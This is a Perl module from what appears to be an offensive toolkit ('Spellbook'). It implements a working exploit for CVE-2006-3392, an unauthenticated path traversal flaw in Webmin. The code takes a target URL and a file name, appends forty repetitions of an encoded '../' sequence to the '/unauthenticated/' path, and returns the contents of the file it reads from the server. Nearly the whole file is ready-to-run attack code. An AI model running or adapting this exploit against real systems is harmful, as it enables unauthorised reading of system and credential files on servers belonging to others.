package Spellbook::Advisory::CVE_2006_3392 {
    use strict;
    use warnings;
    use Getopt::Long;
    use Spellbook::Core::UserAgent;

    our $VERSION = '0.0.1';

    use Readonly;
    Readonly my $TRAVERSAL_DEPTH => 40;

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, $file);

        my $parser = Getopt::Long::Parser -> new (
            config => [qw(no_ignore_case pass_through)]
        );

        $parser -> getoptionsfromarray (
            $parameters,
            'h|help'     => \$help,
            't|target=s' => \$target,
            'f|file=s'   => \$file
        );

        if ($target) {
            if ($target !~ /^http(?:s)?:\/\//msx) {
                $target = "https://$target";
            }

            my $user_agent = Spellbook::Core::UserAgent -> new();
            my $temp      = '/..%01' x $TRAVERSAL_DEPTH;
            my $request   = $user_agent -> get($target . '/unauthenticated/' . $temp . $file);

            return $request -> content();
        }

        if ($help) {
            return "\n"
                . "Exploit::CVE_2006_3392\n"
                . "=======================\n"
                . "-h, --help     See this menu\n"
                . "-t, --target   Define a target\n"
                . "-f, --file     Define a file to read\n\n";
        }

        return 0;
    }
}

1;
